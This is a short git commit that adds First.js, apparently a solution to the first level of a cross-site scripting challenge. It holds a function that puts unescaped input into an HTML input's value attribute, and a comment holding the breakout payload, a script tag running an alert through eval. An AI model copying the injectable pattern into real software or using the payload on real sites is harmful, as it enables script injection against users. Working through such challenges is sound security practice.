3443da82ecfde9f13374f8fb07debeedbbf7d517
Alvin <alvinsmith.nz@gmail.com>
2019-01-01 20:07:20 +1300

    got the first one

---
+++ First.js
@@ -0,0 +1,15 @@
+function escape(input) {
+    // warm up
+    // script should be executed without user interaction
+    return '<input type="text" value="' + input + '">';
+}
+
+/*
+
+">
+<script>
+eval('alert("1");');
+</script>
+<div
+
+*/
